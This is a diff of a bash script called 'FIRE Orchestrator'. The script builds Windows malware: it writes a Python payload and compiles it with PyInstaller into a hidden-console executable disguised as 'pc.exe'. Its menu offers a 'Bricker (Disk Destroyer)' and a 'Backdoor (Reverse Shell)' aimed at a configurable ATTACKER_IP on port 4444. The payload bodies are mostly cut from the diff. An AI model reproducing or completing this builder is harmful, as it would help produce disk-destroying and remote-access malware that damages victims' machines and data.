@@ -18,40 +18,37 @@ cat << "EOF"
        [ FIRE // Orchestrator v5 - Self-Contained ]
 EOF
 
-# --- CONFIGURATION ---
+
 ATTACKER_IP="YOUR_IP_ADDRESS" # <-- CHANGE THIS
 ATTACKER_PORT="4444"
 
-# --- SETUP ---
+
 VENV_DIR="./fire_venv"
-# Create a virtual environment if it doesn't exist
+
 if [ ! -d "$VENV_DIR" ]; then
     echo -e "${Y}[*] Creating isolated Python environment...${NC}"
     python3 -m venv "$VENV_DIR"
 fi
 
-# Activate the virtual environment
+
 source "$VENV_DIR/bin/activate"
 
-# Install PyInstaller inside the venv if not already installed
 if ! python3 -c "import PyInstaller" &> /dev/null; then
     echo -e "${Y}[*] PyInstaller not found in venv. Installing...${NC}"
     pip install pyinstaller > /dev/null 2>&1
 fi
 
-# Create a working directory
 WORK_DIR="./fire_build"
 mkdir -p "$WORK_DIR"
 cd "$WORK_DIR"
 
-# --- PAYLOAD GENERATION ---
 generate_payload() {
     local type=$1
     local final_name="pc.exe"
     echo -e "${Y}[*] Generating Python payload for type: $type${NC}"
 
     case $type in
-        1) # BRICKER
+        1) 
             cat > "payload.py" << EOP
 import os, sys
 if sys.platform == "win32":
@@ -159,9 +156,9 @@ EOP
             ;;
     esac
 
-    # --- COMPILATION ---
+    
     echo -e "${Y}[*] Compiling to a standalone executable...${NC}"
-    # Use the pyinstaller from our virtual environment. The path is now correct.
+    
     pyinstaller --onefile --noconsole --name="$final_name" payload.py
 
     if [ -f "dist/$final_name" ]; then
@@ -170,13 +167,13 @@ EOP
     else
         echo -e "${R}[!] Failed to create .exe. Check for errors above.${NC}"
     fi
-    # Move back to the original directory before cleanup
+    
     cd ..
-    # Clean up the build directory
+   
     rm -rf "$WORK_DIR"
 }
 
-# --- MAIN MENU ---
+
 echo -e "${B}SELECT PAYLOAD TYPE:${NC}"
 echo "1) Bricker (Disk Destroyer)"
 echo "2) Backdoor (Reverse Shell)"
@@ -189,7 +186,7 @@ read -p ">> " payload_choice
 echo -e "\n${R}--- GENERATING PAYLOAD ---${NC}"
 generate_payload "$payload_choice"
 
-# Deactivate the virtual environment at the very end
+
 deactivate
 
 echo -e "${G}>> OPERATION COMPLETE. Check the parent directory for 'pc.exe'.${NC}"
